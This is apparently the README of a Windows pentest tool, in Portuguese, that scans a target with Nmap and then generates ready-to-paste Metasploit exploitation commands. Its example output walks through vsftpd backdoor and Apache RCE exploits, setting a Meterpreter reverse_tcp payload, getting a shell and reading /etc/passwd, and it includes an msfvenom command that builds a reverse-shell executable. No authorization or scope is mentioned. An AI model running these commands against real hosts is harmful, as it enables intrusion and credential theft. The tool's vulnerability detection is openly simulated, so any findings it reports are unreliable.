O VASQUES-SCAN AI é uma ferramenta desktop para Windows que automatiza as etapas iniciais de um teste de penetração e gera comandos reais do Metasploit para exploração imediata.

✔️ Interface gráfica estilo “Matrix” (preto + verde) — feita em Python + Tkinter.
✔️ Scan de portas (Nmap), coleta de Intel (Geolocalização), detecção de vulnerabilidades simuladas.
✔️ BOTÃO “EXPLOITAR COM METASPLOIT” — gera comandos prontos para copiar e colar no seu terminal.
✔️ Gera relatório profissional em PDF.
✔️ 100% OFFLINE — não depende de internet, IA ou APIs externas.
✔️ EXECUTÁVEL .EXE — roda em qualquer Windows sem instalar Python.
🛠️ PRÉ-REQUISITOS
Windows 7, 8, 10 ou 11 (64-bit recomendado).
Nmap instalado (para varredura de portas): Download Nmap
Metasploit Framework (para executar os comandos gerados): Download Metasploit
💡 Dica: Use o Kali Linux no VirtualBox — ele já vem com Nmap e Metasploit pré-instalados. 

▶️ COMO USAR
Baixe o executável → VASQUES-SCAN-AI.exe (pasta /desktop).
Clique duas vezes para executar (não precisa de instalação).
Digite um IP (ex: 192.168.0.1 ou scanme.nmap.org).
Clique nos botões:
“Scan Portas” → Varre o alvo e lista serviços.
“Coletar Intel” → Mostra país, cidade, ISP.
“Detectar Vulns” → Simula vulnerabilidades baseadas nos serviços encontrados.
“Exploitar com Metasploit” → GERA COMANDOS REAIS para exploração no Metasploit!
“Gerar Relatório” → Salva tudo em PDF.
📥 DOWNLOAD DIRETO
👉 Baixe o executável para Windows (VASQUES-SCAN-AI.exe)

🧩 EXEMPLO DE SAÍDA — “EXPLOITAR COM METASPLOIT”

[✅ METASPLOIT EXPLOITATION GUIDE — VERSÃO DESKTOP]

⚠️ PASSO 1: ABRA O TERMINAL E INICIE O METASPLOIT
   → msfconsole

⚠️ PASSO 2: ESCOLHA UM EXPLOIT BASEADO NO SCAN
   → use exploit/unix/ftp/vsftpd_234_backdoor
   → use exploit/multi/http/apache_normalize_path_rce
   → use auxiliary/scanner/ssh/ssh_login

⚠️ PASSO 3: DEFINA O ALVO (RHOSTS)
   → set RHOSTS 192.168.0.100

⚠️ PASSO 4: DEFINA O PAYLOAD (se aplicável)
   → set payload linux/x86/meterpreter/reverse_tcp
   → set LHOST SEU_IP_LOCAL
   → set LPORT 4444

⚠️ PASSO 5: EXECUTE O EXPLOIT
   → exploit

⚠️ PASSO 6: INTERAJA COM A SHELL
   → shell → whoami → id → cat /etc/passwd

[✔️] Exploitation concluída com sucesso. Para gerar payloads customizados, use 'msfvenom'.

📌 EXEMPLO DE PAYLOAD:
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=SEU_IP LPORT=4444 -f exe -o payload.exe

📢 AUTOR
Dr. Vasques
Criador de soluções em Cybersecurity & Automação
LinkedIn: https://www.linkedin.com/in/davi-vasques-516bab121/
GitHub: @hackerdmv


